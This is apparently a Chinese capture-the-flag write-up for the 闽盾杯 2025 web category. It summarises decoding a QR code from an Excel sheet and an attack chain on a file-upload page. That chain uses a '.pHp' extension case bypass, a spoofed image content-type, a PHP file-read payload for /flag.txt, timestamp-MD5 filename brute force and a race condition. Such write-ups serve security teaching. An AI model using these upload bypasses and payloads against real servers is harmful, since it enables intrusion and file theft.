# 闽盾杯2025部分题解

> 赛事：闽盾杯 2025 | 方向：web | 难度：medium

## 一句话总结

闽盾杯2025:QR_Maze.xlsx(Excel+PIL 6倍画二维码)+upload.php(1.pHp大小写+content-type image/png+<?=file()读flag)+MD5时间窗口爆破文件名(±2秒)+5线程条件竞争读

## 攻击链

1. QR_Maze.xlsx: zipfile打开xlsx+ET解析xl/worksheets/sheet+sharedStrings+>0.5判断1/0+PIL画图+resize 6倍|upload.php: 1.pHp大小写+content-type image/png+<?=print_r(file(''/flag.txt''));?>|md5(timestamp).php文件名爆破:datetime.utcnow()±2秒 strftime(''%Y%m%d%H%M%S'') md5|条件竞争: 5个读取线程+0.05s延时上传+stop_event

## 关键 payload

```
zipfile.ZipFile + ET.fromstring + a1rc r''(\w+)(\d+)'' + float(v.text)>0.5 ? 1 : 0 + PIL L 255/0 + resize 6x|filename=''1.pHp'' content=''<?= print_r(file("/flag.txt"));?>''|datetime.utcnow()+timedelta(seconds=offset) timestamp.strftime(''%Y%m%d%H%M%S'') md5 .php|threads 5 + time.sleep(0.05) + upload + stop_event.set()
```

## 经验教训

1) xlsx=zip+xml:zipfile+ET解析worksheet+sharedStrings+>0.5判断01; 2) PIL.resize 6倍放大:Image.NEAREST邻插值; 3) upload.php .pHp大小写绕(content-type image/png+扩展名大小写绕后缀检查); 4) MD5(timestamp).php文件名爆破:时间窗口±2秒+5线程竞争; 5) condition race:多线程同时读+stop_event抢锁
